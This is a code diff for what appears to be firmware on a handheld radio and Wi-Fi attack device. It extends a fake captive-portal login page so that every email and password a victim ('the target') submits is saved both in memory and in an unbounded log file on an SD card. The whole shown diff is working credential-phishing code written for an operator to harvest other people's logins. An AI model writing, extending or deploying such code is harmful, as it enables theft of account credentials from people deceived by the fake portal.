@@ -77,14 +77,39 @@ void sendLanding() {
 
 void handleRoot() { sendLanding(); }
 
+// Append a captured credential to a single rolling log on SD, one line per
+// submission: "U: <email> P: <password>". No timestamp — this board has no
+// reliable clock (only a build-time seed) unless NTP has run, so a date would
+// be misleading. The captive portal owns the Wifi radio, not the SPI radios
+// (CC1101/NRF24), so the SD bus is free here and the card stays mounted; we
+// keep the file open only long enough to append + flush.
+void appendCredToSd(const String& user, const String& pass) {
+    if (!board::sdMounted()) return;
+    if (!SD.exists("/capture"))        SD.mkdir("/capture");
+    if (!SD.exists("/capture/portal")) SD.mkdir("/capture/portal");
+    File f = SD.open("/capture/portal/creds.log", FILE_APPEND);
+    if (!f) return;
+    // Collapse any CR/LF in the submitted values so a crafted field can't
+    // break the one-line-per-capture format.
+    String u = user; u.replace('\n', ' '); u.replace('\r', ' ');
+    String p = pass; p.replace('\n', ' '); p.replace('\r', ' ');
+    f.printf("U: %s P: %s\n", u.c_str(), p.c_str());
+    f.close();
+}
+
 void handleSubmit() {
+    String user = g_http->arg("u");
+    String pass = g_http->arg("p");
+    // In-memory list backs the on-screen scrollback and is capped at MAX_SUBS;
+    // the SD log is unbounded — keep appending every capture past the cap.
     if (g_subCount < MAX_SUBS) {
         auto& s = g_subs[g_subCount++];
-        s.user = g_http->arg("u");
-        s.pass = g_http->arg("p");
+        s.user = user;
+        s.pass = pass;
         s.clientIp = g_http->client().remoteIP().toString();
         s.ms = millis();
     }
+    appendCredToSd(user, pass);
     // After capture, serve a "connecting" page. Prefer a template on SD
     // (post.html) if provided — lets the operator customize what the
     // target sees after submitting.
